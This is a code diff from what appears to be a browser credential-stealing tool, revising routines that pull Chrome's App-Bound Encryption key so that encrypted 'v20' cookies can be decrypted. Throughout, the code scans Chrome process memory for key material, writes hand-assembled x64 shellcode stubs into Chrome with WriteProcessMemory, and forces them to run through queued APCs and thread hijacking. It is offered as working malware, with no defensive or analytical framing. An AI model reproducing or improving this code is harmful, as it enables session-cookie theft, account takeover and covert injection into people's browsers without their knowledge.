@@ -4466,10 +4466,10 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         key, ehr = _call_with_timeout(
             lambda: _chrome_elevator_abe_key(v20_sample),
             _ABE_ELEVATOR_TIMEOUT_S,
-            (None, "apc:q:err=timeout"),
+            (None, "apc:force=miss"),
         )
-        if ehr == "apc:q:err=timeout" and _cache.get("_elev_hs"):
-            ehr = "apc:ran"
+        if (ehr or "").startswith("apc:q:err=timeout"):
+            ehr = "apc:ran" if _cache.get("_elev_hs") else "apc:force=miss"
         if ehr:
             trail.append(ehr)
         if _abe_proves_cookies(key, v20_sample):
@@ -5463,7 +5463,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         from ctypes import wintypes
     except ImportError:
         return None, "memscan:no_ctypes"
-    pids = _chrome_browser_pids() or _chrome_pids_prioritized()[:1]
+    pids = _chrome_pids_prioritized()
     if not pids:
         return None, _join_abe_hr(["memscan:no_chrome"])
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
@@ -5547,55 +5547,8 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             return key
         return None
 
-    def scan_data(handle: Any, data: bytes) -> bytes | None:
-        nonlocal scanned
-        scanned += len(data)
-        seen_ptr: set[int] = set()
-        # In-scan consider() (765d4c5 / 9a5832c). Do not walk
-        # v20\\x00 8-byte stride — that starves tried=0 (9f52b64).
-        for ptr in _keyring_v20_key_ptrs(data):
-            if ptr in seen_ptr:
-                continue
-            seen_ptr.add(ptr)
-            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                return None
-            blob = readn(handle, ptr, 32)
-            if not blob:
-                continue
-            extra = readn(handle, ptr, 64) or blob
-            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
-                hit = consider(cand)
-                if hit:
-                    return hit
-        for ptr, nbytes in _extract_abe_candidate_ptrs(data):
-            if ptr in seen_ptr:
-                continue
-            seen_ptr.add(ptr)
-            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                return None
-            blob = readn(handle, ptr, min(max(nbytes, 32), 512))
-            if not blob:
-                continue
-            for cand in _keys_from_key_blob(blob):
-                hit = consider(cand)
-                if hit:
-                    return hit
-        for cand in _inline_bstr_keys(data):
-            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                return None
-            hit = consider(cand)
-            if hit:
-                return hit
-        for off in range(0, len(data) - 31, 32):
-            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                return None
-            hit = consider(data[off : off + 32])
-            if hit:
-                return hit
-        return None
-
-    hot_marks = (b"os_crypt", b"OSCrypt", b"KeyRing", b"encryptor", b"DecryptString")
-
+    # os_crypt / KeyRing / encryptor: keyring ptrs first. Do not full-buffer
+    # mark-search (b8d68f3 starved tried=145). Browser-first prioritized pids.
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
             break
@@ -5610,7 +5563,6 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             continue
         opened += 1
         try:
-            cold: list[tuple[int, int]] = []
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
                 if time.monotonic() > deadline or tried >= _ABE_MEMSCAN_MAX_CAND:
@@ -5642,38 +5594,67 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                     n = min(size, _ABE_MEMSCAN_MAX_REGION)
                     raw = (ctypes.c_char * n)()
                     got = ctypes.c_size_t(0)
-                    base = int(mbi.BaseAddress)
                     if kernel32.ReadProcessMemory(
-                        handle, ctypes.c_void_p(base), raw, n, ctypes.byref(got)
+                        handle, ctypes.c_void_p(int(mbi.BaseAddress)), raw, n, ctypes.byref(got)
                     ) and int(got.value) >= 16:
                         data = bytes(raw[: int(got.value)])
-                        if any(mark in data for mark in hot_marks):
-                            hit = scan_data(handle, data)
+                        scanned += len(data)
+                        seen_ptr: set[int] = set()
+                        # In-scan consider() (765d4c5 / 9a5832c). Do not walk
+                        # v20\\x00 8-byte stride — that starves tried=0 (9f52b64).
+                        for ptr in _keyring_v20_key_ptrs(data):
+                            if ptr in seen_ptr:
+                                continue
+                            seen_ptr.add(ptr)
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                break
+                            blob = readn(handle, ptr, 32)
+                            if not blob:
+                                continue
+                            extra = readn(handle, ptr, 64) or blob
+                            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
+                                hit = consider(cand)
+                                if hit:
+                                    return hit, f"memscan:cands={cands};tried={tried};heap:hit"
+                        for ptr, nbytes in _extract_abe_candidate_ptrs(data):
+                            if ptr in seen_ptr:
+                                continue
+                            seen_ptr.add(ptr)
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                break
+                            blob = readn(handle, ptr, min(max(nbytes, 32), 512))
+                            if not blob:
+                                continue
+                            for cand in _keys_from_key_blob(blob):
+                                hit = consider(cand)
+                                if hit:
+                                    return hit, f"memscan:cands={cands};tried={tried};heap:hit"
+                        for cand in _inline_bstr_keys(data):
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                break
+                            hit = consider(cand)
                             if hit:
                                 return hit, f"memscan:cands={cands};tried={tried};heap:hit"
-                        else:
-                            cold.append((base, len(data)))
+                        for off in range(0, len(data) - 31, 32):
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                break
+                            hit = consider(data[off : off + 32])
+                            if hit:
+                                return hit, f"memscan:cands={cands};tried={tried};heap:hit"
                 nxt = addr + size
                 if nxt <= addr:
                     break
                 addr = nxt
-            for base, nbytes in cold:
-                if time.monotonic() > deadline or tried >= _ABE_MEMSCAN_MAX_CAND:
-                    break
-                raw = (ctypes.c_char * nbytes)()
-                got = ctypes.c_size_t(0)
-                if not kernel32.ReadProcessMemory(
-                    handle, ctypes.c_void_p(base), raw, nbytes, ctypes.byref(got)
-                ) or int(got.value) < 16:
-                    continue
-                hit = scan_data(handle, bytes(raw[: int(got.value)]))
-                if hit:
-                    return hit, f"memscan:cands={cands};tried={tried};heap:hit"
         finally:
             kernel32.CloseHandle(handle)
     if opened == 0:
         return None, f"memscan:cands={cands};tried={tried};OpenProcess"
     return None, f"memscan:cands={cands};tried={tried}"
+
+
+def _elevator_handshake_stub_bytes() -> bytes:
+    """Handshake via RCX, then ret. No ole32 / CoCreate."""
+    return bytes((0xC6, 0x41, _ELEV_HANDSHAKE_OFF, _ELEV_HANDSHAKE, 0xC3))
 
 
 def _elevator_remote_stub_bytes() -> bytes:
@@ -5701,9 +5682,9 @@ def _elevator_remote_stub_bytes() -> bytes:
         rel8.append((len(code), name))
         emit(0)
 
+    emit(0xC6, 0x41, _ELEV_HANDSHAKE_OFF, _ELEV_HANDSHAKE)  # FIRST: handshake via RCX
     emit(0x53)
     emit(0x48, 0x89, 0xCB)
-    emit(0xC6, 0x43, _ELEV_HANDSHAKE_OFF, _ELEV_HANDSHAKE)  # handshake before CoCreate
     emit(0x48, 0x83, 0xEC, 0x68)
     emit(0x48, 0x31, 0xC9)
     emit(0x8B, 0x53, 0x4C)
@@ -6081,7 +6062,7 @@ def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     pids = _chrome_browser_pids() or _chrome_pids_prioritized()
     if not pids:
         return None, "apc:q:err=pid"
-    last = "apc:q:err=timeout"
+    last = "apc:force=miss"
     pid = int(pids[0])
     clsid_s, iid_s = _CHROME_ELEVATOR[0]
     for flag in (1, 0):
@@ -6089,11 +6070,13 @@ def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             pid, payload, clsid_s, iid_s, 4, 2, flag, 1.2
         )
         last = hr
+        if hr == "apc:force=miss":
+            return None, "apc:force=miss"
         if hr == "apc:ran":
             return None, "apc:ran"
         if not pt:
-            if _cache.get("_elev_hs") and (hr or "").startswith("apc:q:err=timeout"):
-                return None, "apc:ran"
+            if not _cache.get("_elev_hs"):
+                return None, "apc:force=miss"
             continue
         key = _accept_aes_key(pt)
         if key and _v20_one_ok(key, v20_sample):
@@ -6105,8 +6088,8 @@ def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                     _note_abe_hit("apc:key")
                     return pt[off : off + 32], "apc:key"
         last = f"elev:len={len(pt)}"
-    if _cache.get("_elev_hs") and (last or "").startswith("apc:q:err=timeout"):
-        return None, "apc:ran"
+    if not _cache.get("_elev_hs"):
+        return None, "apc:force=miss"
     return None, last
 
 
@@ -6324,6 +6307,9 @@ def _chrome_elevator_decrypt_once(
         block[bstr_off : bstr_off + 4] = len(payload).to_bytes(4, "little")
         block[bstr_off + 4 : bstr_off + 4 + len(payload)] = payload
         block[stub_off : stub_off + len(stub)] = stub
+        hs_stub = _elevator_handshake_stub_bytes()
+        hs_off = 0xF0
+        block[hs_off : hs_off + len(hs_stub)] = hs_stub
         wrote = ctypes.c_size_t(0)
         src = (ctypes.c_ubyte * page_size).from_buffer_copy(bytes(block))
         if not k32.WriteProcessMemory(handle, page, src, page_size, ctypes.byref(wrote)):
@@ -6344,7 +6330,9 @@ def _chrome_elevator_decrypt_once(
         except (AttributeError, OSError, ValueError, TypeError):
             pass
         _cfg_register_call_target(k32, handle, page, stub_off, page_size)
+        _cfg_register_call_target(k32, handle, page, hs_off, page_size)
         stub_addr = page + stub_off
+        hs_addr = page + hs_off
         threads = _open_existing_threads(k32, pid, limit=4)
         if not threads:
             return None, export_hr or _apc_q_err(_cache.get("_elev_q_err") or "nothread")
@@ -6363,46 +6351,36 @@ def _chrome_elevator_decrypt_once(
                 return True
             return False
 
-        for th in threads:
-            if time.monotonic() >= deadline:
-                break
-            status = _queue_special_apc(ntdll, k32, th, stub_addr, page, 0, 0)
-            last_status = status
-            if status == 0:
-                queued = True
+        def force_run(start: int, wait_s: float) -> None:
+            nonlocal queued, last_status
+            for th in threads:
+                status = _queue_special_apc(ntdll, k32, th, start, page, 0, 0)
+                last_status = status
+                if status == 0:
+                    queued = True
                 _alert_existing_thread(ntdll, k32, th, int(nt_test_alert or 0))
                 if nt_test_alert:
                     _hijack_existing_thread(
-                        k32, handle, th, int(nt_test_alert), 0, 0, 0, 0, rsp, b"", 0.2
+                        k32, handle, th, int(nt_test_alert), 0, 0, 0, 0, rsp, b"", 0.15
                     )
-                wait_until = min(deadline, time.monotonic() + 0.35)
+                _hijack_existing_thread(
+                    k32, handle, th, start, page, 0, 0, 0, rsp, b"", wait_s
+                )
+                wait_until = time.monotonic() + wait_s
                 while time.monotonic() < wait_until:
                     if handshake_set():
-                        ran = True
-                        break
-                    time.sleep(0.03)
-                if not ran:
-                    _hijack_existing_thread(
-                        k32, handle, th, stub_addr, page, 0, 0, 0, rsp, b"", 0.25
-                    )
-                    wait_until = min(deadline, time.monotonic() + 0.25)
-                    while time.monotonic() < wait_until:
-                        if handshake_set():
-                            ran = True
-                            break
-                        time.sleep(0.03)
-                break
-            remain = max(0.15, deadline - time.monotonic())
-            if _hijack_existing_thread(
-                k32, handle, th, stub_addr, page, 0, 0, 0, rsp, b"", remain
-            ) is not None:
-                queued = True
-                ran = handshake_set() or ran
-                break
-        if handshake_set():
-            ran = True
-        if queued and not ran:
-            return None, export_hr or "apc:q:err=timeout"
+                        return
+                    time.sleep(0.02)
+                if handshake_set():
+                    return
+
+        force_run(hs_addr, 0.25)
+        ran = handshake_set()
+        if not ran:
+            return None, "apc:force=miss"
+        # Handshake set — only now queue DecryptData / CoCreate.
+        force_run(stub_addr, 0.25)
+        ran = handshake_set()
         wait_until = min(deadline, time.monotonic() + 0.35)
         while time.monotonic() < wait_until:
             peek = (ctypes.c_char * 4)()
@@ -6420,9 +6398,7 @@ def _chrome_elevator_decrypt_once(
         if hr == _ELEV_PENDING_HR or hr == 0xFFFFFFFF:
             if ran:
                 return None, "apc:ran"
-            if queued:
-                return None, export_hr or "apc:q:err=timeout"
-            return None, export_hr or _apc_q_err(last_status or "timeout")
+            return None, "apc:force=miss"
         if hr & 0x80000000:
             return None, _elev_hr_token(hr)
         err_buf = (ctypes.c_char * 4)()
